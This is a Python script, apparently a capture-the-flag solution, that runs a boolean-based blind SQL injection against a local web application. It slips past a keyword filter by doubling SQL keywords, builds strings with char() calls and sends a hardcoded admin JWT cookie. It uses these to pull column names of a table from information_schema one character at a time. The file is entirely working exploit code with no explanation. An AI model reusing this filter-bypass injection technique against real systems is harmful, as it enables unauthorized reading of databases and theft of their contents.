import requests
starter_list = []
result = []
for i in range(97, 122):
    response = requests.get('http://127.0.0.1:8008/post?id=2 aandnd exists(selselectect column_name frfromom infoorrmation_schema.columns whwhereere tatableble_name = concat(char(101),char(110),char(99)) aandnd column_name lilikeke concat(char(' + str(i) + '),char(37)) )', headers={'Cookie': 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6dHJ1ZSwidXNlciI6ImFkbWluIiwiaGludCI6Im5vdGhpbmcgaGVyZSJ9.0PfeyUVvAFvevm4GDMMLidco89OHmwGIwkDl8vmM01M'})
    if "img src" in response.text:
        starter_list.append(i)
        result.append(chr(i))

num_of_tables = len(starter_list)
request_components = []
for element in starter_list :
    temp_req_comp = 'char(' + str(element) + '),'
    request_components.append(temp_req_comp)
k = 0
for element in request_components:
    while True:
        flag = False
        for i in range(97, 122):
            response = requests.get('http://127.0.0.1:8008/post?id=2 aandnd exists(selselectect column_name frfromom infoorrmation_schema.columns whwhereere tatableble_name = concat(char(101),char(110),char(99)) aandnd column_name lilikeke concat('+ element +'char(' + str(i) + '),char(37)) )', headers={'Cookie': 'token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6dHJ1ZSwidXNlciI6ImFkbWluIiwiaGludCI6Im5vdGhpbmcgaGVyZSJ9.0PfeyUVvAFvevm4GDMMLidco89OHmwGIwkDl8vmM01M'})
            if "img src" in response.text:
                result[k] = result[k] + chr(i)
                element = element + 'char(' + str(i) + '),'
                flag = True
        if(not flag):
            k = k +1
            break
print(result)